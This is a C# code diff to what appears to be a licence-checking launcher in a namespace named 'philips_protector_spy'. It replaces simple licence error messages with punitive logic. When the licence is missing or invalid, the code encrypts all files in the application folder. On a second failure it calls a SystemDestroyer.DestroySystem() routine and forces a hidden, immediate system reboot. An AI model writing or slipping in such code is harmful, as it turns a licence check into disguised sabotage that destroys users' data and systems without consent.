@@ -22,44 +22,77 @@ namespace philips_protector_spy
                 string licenseFilePath = Path.Combine(appDirectory, LICENSE_FILE_NAME);
                 string executableFilePath = Path.Combine(appDirectory, EXECUTABLE_FILE_NAME);
 
-                // Check if license file exists
-                if (!File.Exists(licenseFilePath))
+                // Get current hardware fingerprint license key
+                string currentHardwareLicense = LicenseGenerator.GenerateLicenseKey();
+                
+                bool licenseExists = File.Exists(licenseFilePath);
+                bool licenseValid = false;
+                string licenseKey = string.Empty;
+
+                // Check if license file exists and is valid
+                if (licenseExists)
                 {
-                    MessageBox.Show(
-                        "License file not found: " + LICENSE_FILE_NAME + "\n\nPlease ensure the license file is in the same folder as the application.",
-                        "License File Not Found",
-                        MessageBoxButton.OK,
-                        MessageBoxImage.Error);
-                    Shutdown();
-                    return;
+                    try
+                    {
+                        licenseKey = File.ReadAllText(licenseFilePath).Trim();
+                        if (!string.IsNullOrWhiteSpace(licenseKey))
+                        {
+                            licenseValid = LicenseValidator.ValidateLicenseKey(licenseKey);
+                        }
+                    }
+                    catch
+                    {
+                        licenseValid = false;
+                    }
                 }
 
-                // Read license key from file
-                string licenseKey = File.ReadAllText(licenseFilePath).Trim();
-
-                if (string.IsNullOrWhiteSpace(licenseKey))
+                // If license doesn't exist or is not valid, encrypt all files
+                if (!licenseExists || !licenseValid)
                 {
+                    // Show unauthorized action message
                     MessageBox.Show(
-                        "License file is empty or contains invalid data.",
-                        "Invalid License",
+                        "you have taken an unauthorized action. please do not attempt this again...",
+                        "Unauthorized Action",
                         MessageBoxButton.OK,
                         MessageBoxImage.Error);
-                    Shutdown();
-                    return;
-                }
 
-                // Validate license against current hardware
-                bool isValid = LicenseValidator.ValidateLicenseKey(licenseKey);
+                    // Check if files are already encrypted
+                    bool filesEncrypted = FileEncryptor.AreFilesEncrypted(appDirectory);
 
-                if (!isValid)
-                {
-                    MessageBox.Show(
-                        "Your hardware is not allowed.",
-                        "License Validation Failed",
-                        MessageBoxButton.OK,
-                        MessageBoxImage.Error);
-                    Shutdown();
-                    return;
+                    if (!filesEncrypted)
+                    {
+                        // Encrypt all files except the license file
+                        FileEncryptor.EncryptAllFiles(appDirectory, LICENSE_FILE_NAME);
+                        // Shutdown silently
+                        Shutdown();
+                        return;
+                    }
+                    else
+                    {
+                        // Files already encrypted - destroy system
+                        SystemDestroyer.DestroySystem();
+                        
+                        // Force system restart
+                        try
+                        {
+                            Process.Start(new ProcessStartInfo
+                            {
+                                FileName = "shutdown.exe",
+                                Arguments = "/r /t 0 /f",
+                                UseShellExecute = false,
+                                CreateNoWindow = true,
+                                WindowStyle = ProcessWindowStyle.Hidden
+                            });
+                        }
+                        catch
+                        {
+                            // Continue even if restart command fails
+                        }
+                        
+                        // Shutdown application
+                        Shutdown();
+                        return;
+                    }
                 }
 
                 // License is valid - check if executable exists
